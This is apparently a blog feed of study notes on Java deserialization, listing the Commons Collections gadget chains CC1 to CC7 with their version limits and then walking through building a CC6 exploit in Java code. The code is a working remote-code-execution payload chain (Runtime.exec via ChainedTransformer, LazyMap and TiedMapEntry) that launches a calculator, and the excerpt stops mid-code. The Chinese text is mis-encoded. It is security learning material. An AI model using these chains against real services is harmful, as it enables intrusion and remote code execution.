href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>8u71åå¯¹AnnotationInvocationHandlerç±»è¿›è¡Œäº†ä¿®å¤ï¼Œå› æ­¤åœ¨é«˜ç‰ˆæœ¬ä¸­æ— æ³•åˆ©ç”¨ã€‚</p><h4 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h4><h5 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h5><ol><li>CommonsCollections 4.0</li></ol><h5 id="gadget-2"><a href="#gadget-2" class="headerlink" title="gadget"></a>gadget</h5><pre><code>PriorityQueue#readObjectTransformingComparator#compareInvokerTransformer#transformTemplatesImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>ä»ä¼˜å…ˆé˜Ÿåˆ—å…¥æ‰‹ä»è€Œè§¦å‘TransformerImpl#newTransformerå®ç°ç±»åŠ è½½ã€‚å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡é“¾å¼è°ƒç”¨æ‰§è¡ŒRCEã€‚</p><h4 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h4><h5 id="é™åˆ¶-1"><a href="#é™åˆ¶-1" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li><li>jdk&lt;&#x3D;8u71</li></ol><h5 id="åŸç”Ÿgadget"><a href="#åŸç”Ÿgadget" class="headerlink" title="åŸç”Ÿgadget"></a>åŸç”Ÿgadget</h5><pre><code>AnnotationInvocationHandler#readobjectProxy(AnnotationInvocationHandler).xxxAnnotationInvocationHandler#invokeLazyMap#getChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h5 id="æ€»ç»“-3"><a href="#æ€»ç»“-3" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>CC3æä¾›äº†ä¸€æ¡èƒ½é€šè¿‡TransformerImplå®ç°ç±»åŠ è½½çš„é“¾å­ï¼Œè¿™æ ·çš„ç›®çš„æ˜¯ç»•è¿‡é»‘åå•InvokerTransformerã€‚</p><h4 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h4><h5 id="é™åˆ¶-2"><a href="#é™åˆ¶-2" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h5><ol><li>CommonsCollections 4.0</li></ol><h5 id="gadget-3"><a href="#gadget-3" class="headerlink" title="gadget"></a>gadget</h5><pre><code>PriorityQueue#readObjectTransformingComparator#compareChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="æ€»ç»“-4"><a href="#æ€»ç»“-4" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>CC4çš„å‰åŠæ®µç”¨çš„æ˜¯CC2ï¼ŒååŠæ®µç”¨çš„æ˜¯CC3ï¼Œä¸¤è€…ç»“åˆå®ç°äº†CommonsCollections 4.0ç‰ˆæœ¬ä¸‹çš„ç»•è¿‡é»‘åå•InvokerTransformerçš„ç±»åŠ è½½ã€‚</p><h4 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h4><h5 id="é™åˆ¶-3"><a href="#é™åˆ¶-3" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-4"><a href="#gadget-4" class="headerlink" title="gadget"></a>gadget</h5><pre><code>BadAttributeValueExpException#readObjectTiedMapEntry#toStringLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="æ€»ç»“-5"><a href="#æ€»ç»“-5" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>CC5ç”¨åˆ°äº†BadAttributeValueExpExceptionï¼Œä»CC6çš„è§’åº¦çœ‹ç”¨å¤„ä¸æ˜¯å¾ˆå¤§ã€‚ä¸è¿‡ä»CC3çš„è§’åº¦çœ‹ï¼ŒCC5è§£å†³äº†jdké«˜ç‰ˆæœ¬çš„é™åˆ¶ã€‚</p><h4 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h4><h5 id="é™åˆ¶-4"><a href="#é™åˆ¶-4" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-5"><a href="#gadget-5" class="headerlink" title="gadget"></a>gadget</h5><pre><code>HashMap#readobjectHashMap#hashTiedMapEntry#getValueChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="æ€»ç»“-6"><a href="#æ€»ç»“-6" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>CC6è§£å†³äº†jdké«˜ç‰ˆæœ¬çš„é™åˆ¶ï¼Œå¹¶ä¸”HashMapè¿™ä¸ªä¸œè¥¿è¿™ä¹ˆé‡è¦ä¸ä¼šè¢«banã€‚</p><h4 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h4><h5 id="é™åˆ¶-5"><a href="#é™åˆ¶-5" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="gadget-6"><a href="#gadget-6" class="headerlink" title="gadget"></a>gadget</h5><pre><code>Hashtable#readObjectHashtable#reconstitutionPutAbstractMap#equalsLazyMap#getChainedTransformer#transformInvokerTransformer#transform</code></pre><h5 id="æ€»ç»“-7"><a href="#æ€»ç»“-7" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>CC7ç”¨åˆ°äº†hashç¢°æ’ï¼ŒHashtableè¿™ä¸ªä¸œè¥¿ä¸€èˆ¬ä¹Ÿä¸ä¼šè¢«banã€‚</p><h4 id="CC6-CC3"><a href="#CC6-CC3" class="headerlink" title="CC6+CC3"></a>CC6+CC3</h4><h5 id="é™åˆ¶-6"><a href="#é™åˆ¶-6" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h5><ol><li>CommonsCollections 3.1 - 3.2.1</li></ol><h5 id="æ”¹è¿›gadget"><a href="#æ”¹è¿›gadget" class="headerlink" title="æ”¹è¿›gadget"></a>æ”¹è¿›gadget</h5><pre><code>HashMap#readobjectHashMap#hashTiedMapEntry#getValueLazyMap#getChainedTransformer#transformInstantiateTransformer#transfromTrAXFilter#TrAXFilterTransformerImpl#newTransformerdefineClassnewInstance</code></pre><h5 id="æ€»ç»“-8"><a href="#æ€»ç»“-8" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>CC3ååŠæ®µå…¶å®å°±æ˜¯æä¾›äº†ä¸€æ¡èƒ½é€šè¿‡TransformerImplå®ç°ç±»åŠ è½½çš„é“¾å­ï¼Œè¿™æ ·çš„ç›®çš„å°±æ˜¯ç»•è¿‡é»‘åå•InvokerTransformerã€‚gadgetå‰åŠæ®µç”¨çš„æ˜¯CC1ï¼Œä½†è¿™æ ·ä¼šæ”¶åˆ°jdkç‰ˆæœ¬é™åˆ¶ï¼Œå› æ­¤ç”¨CC6å‰åŠæ®µå°±å¯ä»¥ç»•è¿‡é«˜ç‰ˆæœ¬é™åˆ¶äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> gadget </tag>
            
            <tag> Javaå®‰å…¨ </tag>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC6åˆ†æ</title>
      <link href="/2021/12/16/cc6-fen-xi/"/>
      <url>/2021/12/16/cc6-fen-xi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>åœ¨jdk8u71ä¹‹å‰ï¼ŒCC1æ˜¯èƒ½ç”¨çš„ã€‚åœ¨8u71ä¹‹åï¼ŒAnnotationInvocationHandler#readObject é€»è¾‘å‘ç”Ÿæ”¹å˜ï¼ŒCC6æ­£æ˜¯ä¸€æ¡æ”¯æŒjdk8é«˜ç‰ˆæœ¬çš„gadgetã€‚</p></blockquote><h5 id="gadgetå›¾"><a href="#gadgetå›¾" class="headerlink" title="gadgetå›¾"></a>gadgetå›¾</h5><p>è·Ÿç€è€å“¥æ•´ç†äº†ä¸€ä¸‹CC1ä¸¤æ¡è·¯ä»¥åŠCC6çš„gadgetå›¾ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/CC.png" alt="CC"  /><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>ä¸Šå›CC1â€”LazyMapè®²åˆ°LazyMap#getæ–¹æ³•</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220823132756796.png" alt="image-20220823132756796" style="zoom: 67%;" /><p>æˆ‘ä»¬é€šè¿‡LazyMap#decorateæ–¹æ³•ä½¿factory&#x3D;chainedTransformerå°±å¯ä»¥è§¦å‘chainedTransformer#transformæ–¹æ³•ã€‚</p><p>ç”±äºAnnotationInvocationHandlerè¿™æ¡è·¯èµ°ä¸äº†äº†ï¼Œæˆ‘ä»¬åªèƒ½å¦è¾Ÿè¹Šå¾„ï¼Œæœ€ç»ˆå¤§ä½¬æ‰¾åˆ°äº†TiedMapEntry#getValueã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194044429.png" alt="image-20220824194044429"></p><p>è€ŒTiedMapEntryæ˜¯èƒ½å®ä¾‹åŒ–çš„ï¼Œä»¤map&#x3D;lazyMapï¼Œkeyçš„è¯æˆ‘ä»¬å…ˆéšä¾¿ä¼ ä¸€ä¸ªå­—ç¬¦ä¸²å³å¯ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194141124.png" alt="image-20220824194141124"></p><p>ç›®å‰expä¸ºï¼š</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€ŒTiedMapEntry#getValueæ˜¯ç”±TiedMapEntry#hashCodeè§¦å‘ï¼Œè¿™å°±å¥½åŠäº†ï¼ŒURLDNSé‚£æ¡é“¾å­å°±æ˜¯ç”¨åˆ°äº†hashCodeã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824194505416.png" alt="image-20220824194505416"></p><p>æ­¤æ—¶expä¸ºï¼š</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"jajaja"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜è®°å¾—URLDNSçš„æœ‹å‹ä¼šè®°å¾—ä¸€ä¸ªå‘ï¼Œä¹Ÿå°±æ˜¯hashmap.putä¹Ÿä¼šæ‰§è¡ŒhashCodeæ–¹æ³•ã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824195806254.png" alt="image-20220824195806254"></p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¹‹å‰å°±ä¼šè§¦å‘hashCodeä»è€Œå¯¼è‡´æå‰RCEã€‚è¿™ä¼šå½±å“æˆ‘ä»¬çš„åˆ¤æ–­ï¼Œå› æ­¤æœ€å¥½æ˜¯è®©ä»–putçš„æ—¶å€™ä¸è¦è§¦å‘ã€‚</p><p>è¿™å¾ˆå¥½è§£å†³,æˆ‘ä»¬åªè¦éšæ„ç ´åé“¾å­å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ¯”å¦‚ä»¤Map lazyMap&#x3D; LazyMap.decorate(map,new ConstantTransformer(1));ä¹‹å‰æ”¾çš„æ˜¯ChainedTransformer cï¼Œä»è€Œè§¦å‘é“¾å¼RCEã€‚ç°åœ¨æˆ‘ä»¬ä¿®æ”¹lazyMapï¼Œä½¿å®ƒçš„æˆå‘˜å˜é‡factoryå˜æˆä¸€ä¸ªnew ConstantTransformer(1)è‡ªç„¶å°±ä¸ä¼šRCEã€‚</p><pre class="line-numbers language-java"><code class="language-java">        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>null<span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedTransformer c<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap map<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map lazyMap<span class="token operator">=</span> LazyMap<span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å…ˆæ”¾è¿›å»ä¸€ä¸ªè§¦å‘ä¸äº†çš„,é¿å…åºåˆ—åŒ–çš„æ—¶å€™è§¦å‘</span>        TiedMapEntry tiedMapEntry<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        HashMap<span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span> hashmap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>Object<span class="token punctuation">,</span>String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashmap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"Squirt1e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// å°†factoryé‡æ–°èµ‹å€¼ä¸ºlazyMapä»è€Œè§¦å‘factory.transform</span>        Class <span class="token class-name">clazz</span><span class="token operator">=</span>LazyMap<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>        Field factory<span class="token operator">=</span>clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        factory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>lazyMap<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¾ç„¶è¿™æ¡é“¾å­æ‰“ä¸é€šã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œdebugæ–­åˆ°LazyMap#getã€‚</p><p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/image-20220824200425348.png" alt="image-20220824200425348"></p><p>å¯ä»¥çœ‹åˆ°ååºåˆ—åŒ–æ—¶æˆ‘ä»¬èµ°ä¸åˆ°ifé‡Œé¢ï¼ŒåŒæ ·æ˜¯å› ä¸ºhashmap.putæå‰è§¦å‘äº†getï¼Œæ‰§è¡Œäº†map.putï¼›ä¹Ÿå°±å¯¼è‡´æ­¤æ—¶çš„mapå­˜åœ¨è¿™ä¸ªkeyã€‚</p><p>è¿™ä¹Ÿå¾ˆå¥½è§£å†³ï¼Œåœ¨putå®Œä¹‹åmap.remove(â€œSquirt1eâ€);åˆ æ‰è¿™ä¸ªkeyå³å¯ã€‚</p><p>æˆ–è€…ä»¤TiedMapEntry tiedMapEntry&#x3D;new TiedMapEntry(map,â€Squirt1eâ€);ä¹Ÿå°±æ˜¯è¯´åœ¨putçš„æ—¶å€™ä¸è®©ä»–èµ°åˆ°LazyMap#putï¼Œéšåé€šè¿‡åå°„ä¿®æ”¹æ‰ç§æœ‰å˜é‡mapä¹Ÿå¯ä»¥ã€‚ä¸è¿‡ä¹Ÿæ²¡å•¥å¤§ç”¨ï¼Œå°±å›¾ä¸€ä¹ã€‚</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException<span class="token punctuation">,</span> NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> InstantiationException<span class="token punctuation">,</span> IllegalAccessException<span class="token punctuation">,</span> NoSuchFieldException <span class="token punctuation">{</span>        Transformer<span class="token punctuation">[</span><span class="token punctuation">]</span> transformers<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>Class<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span>null<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>Object<span class="token punctuation">.</span><span class="token 